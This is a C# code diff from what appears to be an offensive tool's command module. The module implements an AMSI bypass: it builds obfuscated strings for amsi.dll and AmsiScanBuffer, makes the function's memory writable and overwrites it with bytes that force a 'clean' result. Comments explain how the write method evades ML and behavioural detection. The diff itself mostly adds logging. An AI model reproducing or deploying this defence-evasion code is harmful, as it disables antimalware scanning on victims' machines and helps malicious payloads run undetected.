@@ -34,24 +34,40 @@ namespace Chimera.Commands
         private static string _aLib  => new string(new[]{'a','m','s','i','.','d','l','l'});
         private static string _aFunc => string.Concat("Amsi","Scan","Buffer");
 
+        [DllImport("kernel32", SetLastError = true)]
+        private static extern uint GetLastError();
+
         public static bool Apply()
         {
             try
             {
                 IntPtr hAmsi = LoadLibrary(_aLib);
-                if (hAmsi == IntPtr.Zero) return false;
+                if (hAmsi == IntPtr.Zero)
+                {
+                    Logger.Err("AmsiBypass: LoadLibrary failed, GLE=" + GetLastError());
+                    return false;
+                }
+                Logger.Info("AmsiBypass: " + _aLib + " base=0x" + hAmsi.ToString("X"));
 
                 IntPtr fnAddr = GetProcAddress(hAmsi, _aFunc);
-                if (fnAddr == IntPtr.Zero) return false;
+                if (fnAddr == IntPtr.Zero)
+                {
+                    Logger.Err("AmsiBypass: GetProcAddress failed, GLE=" + GetLastError());
+                    return false;
+                }
+                Logger.Info("AmsiBypass: fn=0x" + fnAddr.ToString("X"));
 
                 // Patch: xor eax,eax ; inc eax ; ret  → returns AMSI_RESULT_CLEAN (1)
-                // Avoids the well-known E_INVALIDARG (0x80070057) pattern that ML flags.
                 // Bytes: 33 C0  40  C3
                 byte[] patch = new byte[] { 0x33, 0xC0, 0x40, 0xC3 };
 
                 // Make writable
                 if (!VirtualProtect(fnAddr, (UIntPtr)patch.Length, PAGE_RWX, out uint oldProt))
+                {
+                    Logger.Err("AmsiBypass: VirtualProtect(RWX) failed, GLE=" + GetLastError());
                     return false;
+                }
+                Logger.Info("AmsiBypass: VirtualProtect OK, oldProt=0x" + oldProt.ToString("X"));
 
                 // Write via RtlCopyMemory (ntdll) instead of Marshal.Copy —
                 // avoids the Marshal.Copy + VirtualProtect behavioral combo that triggers !ml.
@@ -63,10 +79,12 @@ namespace Chimera.Commands
                 // Restore page protection
                 VirtualProtect(fnAddr, (UIntPtr)patch.Length, oldProt, out _);
 
+                Logger.Ok("AmsiBypass: patch written at 0x" + fnAddr.ToString("X"));
                 return true;
             }
-            catch
+            catch (Exception ex)
             {
+                Logger.Err("AmsiBypass: exception: " + ex.Message);
                 return false;
             }
         }
